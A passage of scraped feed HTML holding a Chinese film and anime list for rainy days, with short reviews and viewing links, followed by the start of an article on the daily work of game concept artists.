：离家出走的乡下少年帆高来到未知的都市东京，谋生的日子不那么顺遂，东京的大雨也一刻没有停止过。偶然结识了少女阳菜，她和自己的弟弟一起相依为命，并且拥有改变天气的能力。</p>\n<p>电影中整个世界被雨水环绕的氛围非常适合雨天观看，即使剧情设定充满着雨水，却丝毫没有被雨打湿的粘稠感。少男少女仿佛命中注定的相遇和不顾城市倾覆的纯粹情感，让人在影院里真真切切地感受到「就算大雨让这座城市颠倒，我也会给你怀抱」那种深深的羁绊。而见证这一份感动的，正是贯穿电影始终的大雨。</p>\n<p>连绵不绝的大雨让所有人都在渴望晴天，可是「比起晴天，我更需要阳菜啊」，因为「世界只是变回了原样而已」。即便和整个世界背道而驰也在所不惜，可能是只有那个年纪的少年才能拥有的青春和勇气。 RADWIMPS 的音乐伴随着新海诚的画面完美地将电影气氛烘托至高潮，这种近乎完美的契合度仿佛是在告诉我们，天气的阴晴不需要降雨量和阳光决定，被雨淹没的城市也不需要献祭一名少女来拯救 —— 没有你相伴的日子，才会一直都是雨天，我的整个世界也不复存在。</p>\n<h2>[动画] 恋如雨止</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/c6bf546e5706c8fc1bc21eddac6a2f11.png\"></figure><p>关键词：漫画改 / 恋爱 / 青春 / 成长</p>\n<p>片长：24 分钟（单集）× 12 集</p>\n<p>观看渠道：<a href=\"https://www.amazon.com/After-the-Rain/dp/B078X1RBH5\" target=\"_blank\">Amazon Prime Video</a> / <a href=\"https://v.youku.com/v_show/id_XMzMwOTA5MjE3Mg==.html\" target=\"_blank\">优酷</a>（有删改）；<a href=\"https://movie.douban.com/subject/26986740/\" target=\"_blank\">豆瓣链接</a></p>\n<p>读原作：<a href=\"https://manga.bilibili.com/detail/mc25517\" target=\"_blank\">哔哩哔哩漫画</a></p>\n<p>降雨量：★★★★★ 清凉度：★★★★☆</p>\n<blockquote><p>爱在雨过天晴时</p></blockquote>\n<p>@SHY：《恋如雨止》中的雨，是没有预兆的骤雨，饱满的水珠倾盆而下，大声宣泄自己的存在，尽兴后戛然而止，却映得天地更加澄澈。在这样一场暴雨中，失意的 17 岁女高中生橘晶躲进路边的家庭餐厅避雨，得到店长近藤正己赠送的一杯咖啡，被对方表演的小戏法和无意中的鼓励话语触动，喜欢上了这位 45 岁的中年大叔。相差 28 年的恋情注定难以得到众人的祝福，少女的初恋却从不讲理由，陷入单恋的橘来到店中兼职，不擅长表达的她视线前方只有店长，以积极的态度发起攻势。</p>\n<p>面对橘的表白，近藤起初只是以敷衍的心态应付，刻意回避少女满溢的心意与自己的现实处境。然而，形形色色的雨滴引出一个个故事，有着相似失落的两人距离逐渐缩短，橘了解到店长年轻时对纯文学的追求，婚姻和事业失败后的无奈放弃；近藤也发觉眼前的少女因右足受伤退出田径部，搁置曾经的梦想，与友人渐行渐远。炙热的感情促使他们正视自己，互相扶持走出阴影。当阴云散去，曾在屋檐下共享时光的旅人就此分别，怀着从彼此身上汲取的力量出发，雨后晴空，是崭新的起点。</p>\n<h2>🔦 [电影] 雨 Lluvia</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/0948bafa11379b410851f0b38536c32b.png\"></figure><p>关键词：剧情 / 爱情 / 南美</p>\n<p>片长：110 分钟；<a href=\"https://movie.douban.com/subject/3166551/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>不知道是雨天让人心伤，还是伤心的人总在下雨。</p></blockquote>\n<p>降雨量：★★★★★ 清凉度：★★★★☆</p>\n<p>@宽治：布宜诺斯艾利斯的一场暴雨，造成大面积的交通拥堵，也为男女主人公的意外相遇，制造了完美的场景。女主 Alma 以写作为生，在结束了一段破碎的婚姻后，住在一个破旧的车子里，只能靠公共卫生间来梳洗自己。男主 Roberto 为了料理家事回到了这座他出生的城市，但实际上也并没有与这里有什么真正意义上的联系。为了避雨，Roberto 躲上了 Alma 的车，两个都有点「失意」的人就这样在雨中莫名其妙地相遇了。</p>\n<p>短暂的相处并没有带来什么惊天动地的变化，只是如同下个不停的雨水，他们的关系也似乎并没有想要结束，只需要一个小小的触动，情绪便决堤一般涌出。和《爱在黎明破晓前》类似，这部影片推动剧情依靠的也是男女主人公之间大量的对话。在这些对话中，他们逐渐打开了自己，也逐渐找到了修补彼此破碎内心的某种希望。这种感情不一定符合「正统」的价值观，但却是人性真实的救赎。那些雨中相互陪伴的时间是他们重塑生活的火苗，如同影片最后终于放晴的天气，给人新的希望和面对未来的勇气。最后，值得一提的是，在刻画人物方面，影片中的很多心理与行动上的细节都处理得很好，是一部非常有味道的作品。如果你刚好也在下雨天观看的话，也许更会有身体上的通感。</p>\n<h2>[纪录] 雨 Regen</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/736908a8ac7e39b9db461765bf6724f3.png\"></figure><p>关键词：纪录 / 城市 / 黑白</p>\n<p>片长：14 分钟</p>\n<p>观看渠道：<a href=\"https://www.bilibili.com/bangumi/play/ss28147/\" target=\"_blank\">哔哩哔哩</a>；<a href=\"https://movie.douban.com/subject/1464520/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>静静地看一场雨，落下来，停下来。</p></blockquote>\n<p>降雨量：★★★★★ 清凉度：★★★★☆</p>\n<p>@宽治：城市里忙碌的生活让许多人都失去了好好看一场雨的耐心；我们行色匆匆地穿梭在城市的水泥森林之间，伞与屋顶阻隔了我们和雨水之间的接触，也降低了我们体验自然的强度。前卫导演尤里斯·伊文思与曼努斯·弗兰肯在 1920 年代拍摄的这部长约 14 分钟的「<a href=\"https://en.wikipedia.org/wiki/Documentary_film#City-symphony\">城市交响曲</a>」，以充满诗意的镜头，悠然地记录下了阿姆斯特丹的一场暴雨，展现了这座城市在雨水下微妙的变化：湖面泛起涟漪、街头蓄了积水；有人撑起衣服或者雨伞、而另一些人似乎满不在乎；玻璃上的雨水模糊了视线，而城市的呼吸似乎也突然变了节奏……</p>\n<p>影片按照雨落雨停的顺序展开，看似是一场雨，实则是多次拍摄素材的拼贴。伊文思对影片的剪辑呼应了片中自然运动的节奏，加上 Lou Lichtveld 轻松跳跃的配乐，让人在黑白的影像中，感受到了丰富的形式与美感。</p>\n<p>这部短片不仅是一部精彩的视觉诗歌，更会让你想要重新睁大眼睛、用心地去感受自己所生活的环境。如果城市每天都在谱写新的乐章，我们到底可以听到些什么，我们又可以合奏些什么呢？</p>\n<h2>[动画] 少女终末旅行</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/8d70d2420eb0aa25e1276e78f57ce538.png\"></figure><p>关键词：漫画改 / 公路 / 日常 / 致郁</p>\n<p>片长：24 分钟（单集）× 12 集</p>\n<p>观看渠道：<a href=\"https://www.amazon.com/Girls-Last-Tour-Season-1/dp/B0767MNZ9N\" target=\"_blank\">Amazon Prime Video</a> / <a href=\"https://www.bilibili.com/bangumi/media/md6463/\" target=\"_blank\">哔哩哔哩</a>（有删改）；<a href=\"https://movie.douban.com/subject/27081136/\" target=\"_blank\">豆瓣链接</a></p>\n<p>读原作：<a href=\"https://manga.bilibili.com/detail/mc27646\" target=\"_blank\">哔哩哔哩漫画</a></p>\n<p>降雨量：★★★☆☆ 清凉度：★★★★★</p>\n<blockquote><p>与绝望和睦相处</p></blockquote>\n<p>@SHY：《少女终末旅行》中的雨，是延绵不绝的梅雨，闷热不见天日，湿气直沁骨髓，万物染上灰蒙蒙的阴抑色调，怎样调整也难有好心情。末日之后，又过了漫长的岁月，地表生物几近灭绝，都市化为迷宫般的废墟，缺乏维护的机械逐渐停止运转，连有关生存还是毁灭的思考都不复存在。作为人类最后的旅行者，最幸运也最不幸的少女千户与尤莉驾驶千年前设计的半履带摩托车，一日又一日彷徨于崩坏的世界，寻找燃料和食物，间或与文明的余烬相遇，稍加探索，又继续前行。</p>\n<p>这是一段没有意义的旅程，文化传承早已断绝，社会架构亦无法维系。千户与尤莉只是漫无目的地游走，不必肩负世俗压力，末日也成了悠闲的日常，整个世界都是游乐场。她们尝试理解身边的造物，想象着家庭、艺术、战争之类的概念，当淅淅沥沥的雨滴落下，与瓶瓶罐罐交织出完美的和弦，少女重新发明了音乐。在旅行的终末，少女抛弃自己珍视的一切，抵达了空无一物的顶层，用雪球打完最后的世界大战，吃掉仅剩的一点口粮，彼此依偎睡去。星空之下，是最现实的虚无，也是人类文明的墓志铭。</p>\n<h2>[电影] 借着雨点说爱你</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/6dfbadafb95ca01208fc3bfd7e6b208b.png\"></figure><p>关键词：剧情 / 爱情 / 奇幻</p>\n<p>片长：119 分钟 ；<a href=\"https://movie.douban.com/subject/1395080/\" target=\"_blank\">豆瓣链接</a></p>\n<p>降雨量：★★★★★ 清凉度：★★★★☆</p>\n<p>@宇宙浪费指南：比起直译过来的《借着雨点说爱你》，《大约在雨季》更符合电影主题。这个故事发生在雨季，电影播了多久，雨也下了多久，在夏天的日本乡下小镇里，在郁郁葱葱的森林里，甚至在回忆的东京里，都下着无边无际的大雨，在看似没完没了的梅雨季节里，有人盼雨停，有人却希望这场雨永远下着。</p>\n<p>泠在临死前告诉自己乖巧可爱的儿子佑司，「一年后的雨季，我就会回来看你们」，佑司对此深信不疑，每天将晴天娃娃倒挂，希望妈妈快回来；秋穗巧作为一个成年人，虽然觉得有些荒唐，但一边安慰着儿子，一边也在关注着天气预报。雨季如期而至，泠竟没有食言，虽然失去了所有记忆，就连自己的身份都不清楚，但她还是像以前一样无微不至地照顾父子俩……他们的再次相遇，没有发生惊天动地的爱情故事，而是煎蛋、咖喱饭、满院的向日葵……点点滴滴都是过往的温馨生活。但雨季总会结束，放晴后的阳光明媚得让人心碎，叶子上最后一滴水落下的时候，也到了分别的时刻。</p>\n<p>这场时光旅行或许是老天的恩赐，再次出现的泠给父子俩带来了好好生活下去的希望和勇气，这是属于他们的雨季的幸福。</p>\n<p>电影上映的第二年，翻拍了日剧《<a href=\"https://movie.douban.com/subject/2326648/\" target=\"_blank\">现在很想见你</a>》，2018 年又被韩国翻拍了电影《<a href=\"https://movie.douban.com/subject/27018285/\" target=\"_blank\">现在去见你</a>》。</p>\n<h2>[电影] 比海更深</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/d27a634af79d5ba034464b1f04769c97.png\"></figure><p>关键词：剧情 / 家庭</p>\n<p>片长：117 分钟</p>\n<p>观看渠道：<a href=\"https://www.douban.com/link2/?url=http%3A%2F%2Fwww.iqiyi.com%2Fv_19rraoyums.html%3Fvfm%3Dm_331_dbdy%26fv%3D4904d94982104144a1548dd9040df241&amp;subtype=9&amp;type=online-video\" target=\"_blank\">爱奇艺</a> / <a href=\"https://www.douban.com/link2/?url=http%3A%2F%2Fv.qq.com%2Fx%2Fcover%2F1iao15kfi3a5inj.html%3Fptag%3Ddouban.movie&amp;subtype=1&amp;type=online-video\" target=\"_blank\">腾讯视频</a> / <a href=\"https://www.bilibili.com/bangumi/play/ep63669?bsource=douban\" target=\"_blank\">哔哩哔哩</a> / <a href=\"https://www.douban.com/link2/?url=https%3A%2F%2Fwww.ixigua.com%2Fcinema%2Falbum%2F7ZEIjViGKMX%3Futm_source%3Ddouban&amp;subtype=17&amp;type=online-video&amp;link2key=91ec6cf304\" target=\"_blank\">西瓜视频</a>；<a href=\"https://movie.douban.com/subject/26694988/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>即使触摸到你，我也只有相信你如此而已，那是比大海还深，比天空还要蓝。</p></blockquote>\n<p>降雨量：★★★☆☆ 清凉度：★★★★☆</p>\n<p>@Voyager_1 ：看到片名和海报，就让人想到这是枝裕和的电影，不变的家庭和亲情故事，不同的人生和体悟。电影标题取自邓丽君的日文歌曲《別れの予感》（离别的预感）中的一句歌词，影片的故事和叙事风格如大海一般平淡，看似波澜不惊，却在每个人心中种下比海更深的东西。</p>\n<p>故事的前半段虽未下雨，却在开头就交代了台风和暴雨的到来。台风天、暴雨，暗示着这个家庭背后每个人生活的不如意：小说梦破碎却依然坚持的主角良多，对良多遗憾却为现实委身的妻子，老伴去世后努力积极生活的老母亲以及成长中迷糊懵懂又显冷静的儿子……在暴雨未至之时，一点点累积着他们的矛盾与关于未来的迷惘。</p>\n<p>台风到了，这场暴雨对良多是一次契机，「无论好坏，都是我的人生」。他希望借此机会和妻子重归于好，母亲也侧面帮儿子一探虚实，客厅里的谈话是母亲对儿子不经意的教诲，台风天的晚上这个家庭仿佛时光倒流，重归于好。然而这一切只是台风天掩盖下的假象，暴雨中寻找彩票的一家人，在第二天天晴后又会选择不同的生活方向。他们清楚彼此的软肋，所以更加坚定自己选择，即使这选择看起来那么不完美。</p>\n<h2>[电影] 雨中曲</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/5aba105d9115fa254d8932d7c8a9e47c.png\"></figure><p>关键词：喜剧/ 爱情 / 歌舞</p>\n<p>片长：101 分钟；</p>\n<p>观看渠道：<a href=\"https://www.bilibili.com/bangumi/play/ss33933/?from=search&amp;seid=4056371583879272504\" target=\"_blank\">哔哩哔哩</a> / <a href=\"https://www.iqiyi.com/v_19rrho744s.html\" target=\"_blank\">爱奇艺视频</a>；<a href=\"https://movie.douban.com/subject/1293460/\" target=\"_blank\">豆瓣链接</a></p>\n<p>降雨量：★★★☆☆ 清凉度：★★★★☆</p>\n<blockquote><p>教练，我想在雨中跳踢踏舞！</p></blockquote>\n<p>@潘誉晗 ：影片介绍了电影演员唐和歌美人甜的凯茜相识相恋的故事，非常生动有趣。没有人会否认《雨中曲》在歌舞片影史上的地位，男主角在雨中跳舞的桥段更是被奉为经典。配合窗外的大雨，也让人不禁想跟着屏幕中的吉恩·凯利欢乐起舞，在雨天之际看这样一部令人开心的歌舞片，是一个非常棒的选择。</p>\n<p>男主角唐和凯茜吻别之后，在雨中的那段独舞长达四分钟，即使手握着伞，可恋爱中的傻子唐啊，确实需要用雨来让自己冷静一会儿。看他迈着轻盈的步子在雨中边走边唱，那种终于虏获美人心之后的骄傲劲，是任凭多大的雨也无法浇灭的热情。值得一提的是，自导自演的男主角吉恩·凯利在雨中歌舞的拍摄时正发着高烧，知道这个「热知识」之后每次重温这个镜头都非常敬佩他的敬业精神和极强的业务能力，而每一个下雨天，只要我想起这个场景，嘴角也总是会忍不住上扬。</p>\n<h2>[电影] 时空恋旅人</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/51d50b9cc4bb88af8b5ea3862cd8891a.png\"></figure><p>关键词：喜剧 / 爱情 / 奇幻</p>\n<p>片长：123 分钟</p>\n<p>观看渠道：<a href=\"https://www.douban.com/link2/?url=http%3A%2F%2Fv.qq.com%2Fx%2Fcover%2Fg6nvv8jt1y04hu6.html%3Fptag%3Ddouban.movie&amp;subtype=1&amp;type=online-video\" target=\"_blank\">腾讯视频</a> / <a href=\"https://www.douban.com/link2/?url=http%3A%2F%2Fwww.iqiyi.com%2Fv_19rrhofld4.html%3Fvfm%3Dm_331_dbdy%26fv%3D4904d94982104144a1548dd9040df241&amp;subtype=9&amp;type=online-video\" target=\"_blank\">爱奇艺</a>；<a href=\"https://movie.douban.com/subject/10577869/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>我们生活的每一天，都在穿越时空，我们能做的，就是尽其所能，珍惜这趟不平凡的旅程。</p></blockquote>\n<p>降雨量：★★★☆☆ 清凉度：★★★☆☆</p>\n<p>@Voyager_1：时空恋旅人，这恐怕是 About Time 片名最棒的翻译，男主角 Tim 能穿越时空，跟爱人 Mary 在岁月的长河里恋爱，结婚，一起共度人生。有喜有悲，有搞笑有无厘头，在生活中学会爱，这是独属于英国人理查德·柯蒂斯的英式喜剧，有内核而不失温度。</p>\n<p>「你有没有想要有一个阳光明媚的婚礼？」「没有，绝对没有 。」</p>\n<p>21 岁前，Tim 一直在英格兰西南端的康沃尔郡过着普通的生活，直到从父亲那里获知 —— 家族的男性都拥有穿梭时光的能力。移居伦敦，单纯腼腆的 Tim 锲而不舍地追到了 Mary，这当然要归功于超能力和他的真诚。但在关键的婚礼那天，天公却不作美。伴着 Jimmy Fontana 的《Il Mondo》歌声，一袭红衣的 Mary 与 Tim 走出婚姻的殿堂，移步婚礼派对时，康沃尔突然狂风大作，转瞬间天降大雨，婚礼转到室内致辞中结束。Tim 问 Mary 是否想重新选一个好天气结婚，她却坚定地说了不。此时的 Tim 似乎还不明白，有些事情一生一次就够了，无需重来。在狂风大雨的天气看这段情节，总能让人心生感触，难忘也好、坎坷也罢，有时候恶劣的天气反而是强化记忆的标识，让每一份记忆成为心中独一无二的标本。</p>\n<p>回到过去，还是面向未来，理查德·柯蒂斯给出的命题是哲学而严峻的。交给 Tim 的现实是再回去见见离世的父亲，还是面向未来迎接新的生命，一旦选择将无法回头。也许此刻，狂风暴雨中的婚礼才在 Tim 心中发酵，让他作出属于自己的选择。</p>\n<h2>[电影] 不能说的秘密</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/eafff774c4ae0dfcb30ac1cb399582ee.png\"></figure><p>关键词：爱情 / 音乐 / 奇幻</p>\n<p>片长：101 分钟；<a href=\"https://movie.douban.com/subject/2124724/\">豆瓣链接</a></p>\n<p>降雨量：★★☆☆☆ 清凉度：★★★☆☆</p>\n<blockquote><p>最美不是下雨天，是和妳一起躲过的屋檐。</p></blockquote>\n<p>@潘誉晗：淡江艺术高中的转校生叶湘伦在转校第一天参观学校时，被从旧琴房传来的钢琴声吸引，遇见了一个名叫「小雨」的女生。两个一样热爱音乐的青春期的少男少女的纯纯爱恋就这样展开。</p>\n<p>窗外下着绵绵细雨，看着雨滴从窗上慢悠悠落下的时候，我就会想起这一部电影。选择在雨天的时候重温，是因为我时常会想念，那对少男少女的初识的第一天，女生告诉男生自己的名字 ——「路小雨」。他们初遇结伴的那个下午很美好，即使没有雨伞的遮挡，也可以载着好感的女生，也可以坐在心动男生的车后座一起回家，这段剧情总是很戳人。周围小雨霏霏、缠绵不止，而女主角路小雨脸上那种「看破不说破」的笑容，还有叶湘伦明显心动却不好意思的害羞，就好像最后那个 1979 年的夏天，都是美好的青春，也是我年少回忆中一场忘不掉的雨。</p>\n<h2>[电影] 如晴天 似雨天</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/0c5ba189f6dc545fda9c09b5831b1b6b.png\"></figure><p>关键词：剧情 / 音乐</p>\n<p>片长：104 分钟 ；<a href=\"https://movie.douban.com/subject/25738406/\" target=\"_blank\">豆瓣链接</a></p>\n<p>降雨量：★☆☆☆☆ 清凉度：★★★☆☆</p>\n<p>@宇宙浪费指南：这是一个孤独、温馨却飘散着似有若无悲伤的纯爱故事，基调和雨天很配，它有关孤独和陪伴、书籍和音乐。少年和女孩如晴天般相遇，似雨天般别离，天上的雨没落下，这场短暂相遇却在彼此心里下了场大雨。</p>\n<p>男主是一个天才富家男孩，家庭像博物馆一样豪华却毫无温度；女主是一个有着音乐天赋却穷困潦倒的服务生，被餐厅辞退而急需工作的她来到这个家，成为了男孩的保姆。他们稍加磨合便很快熟络，一起吃饭、看电影、聊天......在几个月的朝夕相处中，两个同样孤独的人产生了一种难以言喻、无法归类的感情，显然这超出了友谊，但又很难定义为爱情，大概是一种难言的纯净爱意。他们仿佛从一开始就洞穿彼此的内心，产生了灵魂的交互，就如同结尾台词所说，「认识你真的很好，真的很难想象我和你只相处了几个月，感觉我像认识了你一辈子。」</p>\n<p>《如晴天，似雨天》不只是片尾两人合奏的曲子，也是他们对这段感情的总结。就像每一个发生在雨季的故事，仿佛分离总是难以避免的结局。虽然在漫长的生命里，这只是萍水相逢，是一段很短的际遇，但对于彼此来说，已足够长久挂念、影响人生。</p>\n<h4>🎬 往期特辑：</h4>\n<ul>\n<li><a href=\"https://sspai.com/post/66840\" target=\"_blank\">看什么 · 特别篇丨一张带你环游世界的夏日片单</a></li>\n<li><a href=\"https://sspai.com/post/67265\">看什么 · 特别篇丨比博燃的热血片单，陪你迎战郁热夏天</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67716"},{"title":"游戏美术岗位，哪个最苦逼？","date":"2021-07-18 03:00:08","description":"\n<p>一入画圈深似海，从此头发是路人。</p>\n<p><b>游戏美术的养成需要经过多年苦练，</b></p>\n<p><b>根据分工不同又都各有难点。</b></p>\n<p>我们探访了部分美术同学，</p>\n<p>听听他们是如何“吐槽”自己岗位的。</p>\n<hr>\n<h2>日常卡稿的角色原画师：</h2>\n<p>对原画师来说，</p>\n<p><b>郁闷的一点是经常被弄混。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6f47d802dab1b296ea87b126c14691e7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"198\" data-rawheight=\"171\" data-watermark=\"original\" data-original-src=\"v2-6f47d802dab1b296ea87b126c14691e7\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>很多人可能以为原画是这样的：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-423eff733ae0a9d730da2ac1b1fc4c16_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"882\" data-watermark=\"original\" data-original-src=\"v2-423eff733ae0a9d730da2ac1b1fc4c16\" data-watermark-src=\"v2-31173dd299ffa14a5cb724a5ebb39078\" data-private-watermark-src=\"v2-8f2a5b334e899fb8b0483c375d34d7e5\"></p>\n<p>但其实这是美宣图。</p>\n<p><b>真实的原画是类似这样的：</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-330330edcb013ba10b9d50c404f54e0f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1127\" data-rawheight=\"556\" data-watermark=\"original\" data-original-src=\"v2-330330edcb013ba10b9d50c404f54e0f\" data-watermark-src=\"v2-db4adb4044c2c1639890cbcc74b1fbd3\" data-private-watermark-src=\"v2-d43b9252c96f041c44355cc64c480bbc\"></p>\n<p>这样的：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-52d7c374482e78bb09536ef7bd953396_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1013\" data-rawheight=\"432\" data-watermark=\"original\" data-original-src=\"v2-52d7c374482e78bb09536ef7bd953396\" data-watermark-src=\"v2-0ed719e051b8b0efeb5ba332b1de101b\" data-private-watermark-src=\"v2-5f5d0d99669cfa812604b309b743cfe7\"></p>\n<p><b>美宣顾名思义，</b></p>\n<p><b>一般是用于市场宣传，展现吸引力的精美海报，</b></p>\n<p><b>因此情景完整，神态丰富，重在“画工”</b></p>\n<p><br></p>\n<p><b>原画则往往是美术研发的第一步，</b></p>\n<p><b>更像一张施工图或设计稿，</b></p>\n<p><b>重在发挥想象力和创意的“设计”</b></p>\n<p><br></p>\n<p>为了便于后续3D建模、动画、特效等环节的参考，</p>\n<p>原画的人物姿势不必复杂，</p>\n<p><b>而是以正、侧、背面的三视图为主，</b></p>\n<p><b>将武器、服装、配饰、材质等设定交代分明，</b></p>\n<p>跟美宣的对外功能是十分不同的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0ae26e8e9312a9e9ab48b27130267376_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1506\" data-rawheight=\"307\" data-watermark=\"original\" data-original-src=\"v2-0ae26e8e9312a9e9ab48b27130267376\" data-watermark-src=\"v2-c0021471880e2713e5371a99ebbbb96d\" data-private-watermark-src=\"v2-e9e9b731cbc38f4d0cf10cda0f93d974\"></p>\n<p><b>虽说是创意设计，</b></p>\n<p><b>但原画师并不能随心所欲,</b></p>\n<p><b>完全按自身风格和审美去发挥，</b></p>\n<p><b>而是要适应一套严谨的设计流程。</b></p>\n<p><br></p>\n<p>研发一款皮肤前，</p>\n<p>策划、美术、运营、音频等成员会先展开几轮脑暴会，</p>\n<p>提出潜在的主题提案，</p>\n<p>讨论（chǎo jià）出是否有足够的创意空间和独特亮点。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1121ec988485ac9f04b92db569d4608c_720w.gif?rss\" data-caption=\"其实没那么夸张，还是比较和谐的，同秃与共\" data-size=\"normal\" data-rawwidth=\"719\" data-rawheight=\"385\" data-watermark=\"original\" data-original-src=\"v2-1121ec988485ac9f04b92db569d4608c\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>如果提案得到一致通过，</p>\n<p>世界观架构师就会输出一版文案，</p>\n<p>定下皮肤主题、人设、故事与台词，</p>\n<p>而原画师围绕这些文字展开想象，</p>\n<p>构思如何用视觉语言呈现出来。</p>\n<p><br></p>\n<p><b>但在面对不熟悉的主题或风格时，</b></p>\n<p><b>原画师有时也会感到无从下手，</b></p>\n<p><b>甚至陷入卡壳的状态</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-628964dbe8259ac396ff8df4b695fe21_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"198\" data-rawheight=\"112\" data-watermark=\"original\" data-original-src=\"v2-628964dbe8259ac396ff8df4b695fe21\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>为了寻找灵感，</p>\n<p>原画师会解构主题，</p>\n<p>拆解出关键词，</p>\n<p>并尽可能查阅资料，</p>\n<p>比如看书、看视频、浏览艺术网站，</p>\n<p>变身列文虎克，</p>\n<p>罗列出可融入的视觉元素。</p>\n<p><b>风险是随时可能被当成在上班摸鱼。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-71b803825be93400ff9e403cc6b2a8f3_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"390\" data-watermark=\"original\" data-original-src=\"v2-71b803825be93400ff9e403cc6b2a8f3\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>当然，</b></p>\n<p><b>有时信息太多和信息太少都是同等灾难。</b></p>\n<p>原画师可能被淹没各种元素中，</p>\n<p>或陷入左右互搏的思绪里，</p>\n<p>时间却在飞速流逝，DDL迫近。</p>\n<p><br></p>\n<p><b>这时要赶紧对元素进行提炼，</b></p>\n<p><b>避免停留在完美主义发作的构思阶段。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-54f85904bf5face6bcc995d0b4e18ef9_720w.jpg?rss\" data-caption=\"再次卡稿的原画师\" data-size=\"normal\" data-rawwidth=\"537\" data-rawheight=\"332\" data-watermark=\"original\" data-original-src=\"v2-54f85904bf5face6bcc995d0b4e18ef9\" data-watermark-src=\"v2-37ee9c0de7153ab9703427cb8524344e\" data-private-watermark-src=\"v2-c93dbc9f998ba6dddf1e3bcdc793cdba\"></p>\n<p>经过一番提炼取舍，</p>\n<p>原画师开始动手绘制，</p>\n<p><b>结合对角色气质、体型、玩法、游戏内效果等考虑，</b></p>\n<p><b>将视觉元素融入到皮肤设计中，</b></p>\n<p><b>并推出几版配色方案，</b></p>\n<p><b>及时与团队交流并推进。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6258288db5e6d8d90efb0b0bf29d11b8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1817\" data-rawheight=\"739\" data-watermark=\"original\" data-original-src=\"v2-6258288db5e6d8d90efb0b0bf29d11b8\" data-watermark-src=\"v2-799f8ce0f157f7a80a87baf65d6495fd\" data-private-watermark-src=\"v2-5e27fbefc0120fd93444fc0a5c9c039f\"></p>\n<p><b>对于一些内行的命题，</b></p>\n<p><b>仅凭原画师自己难以保证效果，</b></p>\n<p><b>也会寻求专业支持。</b></p>\n<p><br></p>\n<p>比如<a href=\"https://www.zhihu.com/question/350341955/answer/940622972\" class=\"internal\">“上官婉儿·梁祝”皮肤的设计</a>，</p>\n<p>就与浙江小百花越剧团深度合作；</p>\n<p>而在<a href=\"https://www.zhihu.com/question/35424434/answer/1266262943\" class=\"internal\">“杨玉环·遇见飞天”的皮肤设计</a>中，</p>\n<p>团队飞往敦煌实地考察，</p>\n<p>得到了敦煌研究院的专家指导。</p>\n<p>在一版版推倒重来的打磨后，</p>\n<p>才得到“有神了”的认可。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8456ff561d9f9cbba7e456996b644ba3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1507\" data-rawheight=\"415\" data-watermark=\"original\" data-original-src=\"v2-8456ff561d9f9cbba7e456996b644ba3\" data-watermark-src=\"v2-9066c7daa137d033824f849228ce9567\" data-private-watermark-src=\"v2-249438707953f78bd00c79b9869d8b83\"></p>\n<p><b>有时原画看似不如美宣华丽，</b></p>\n<p><b>但背后也是一场漫长的心智马拉松。</b></p>\n<p><br></p>\n<p>所以如果看到身边的原画师两眼无神，</p>\n<p>发际线日益稀疏，</p>\n<p>那一定是正在绞尽脑汁，</p>\n<p>努力摆脱日常卡稿的状态。</p>\n<p>请大家一定珍爱身边的原画师，</p>\n<p>比如从请TA喝奶茶做起。</p>\n<p><br></p>\n<p><b>至于“原画师和建模师会不会打架？”的历史难题，</b></p>\n<p><b>还是请建模师回答吧！</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3c12ff02d187ac388544df05e23197bd_720w.gif?rss\" data-caption=\"\" 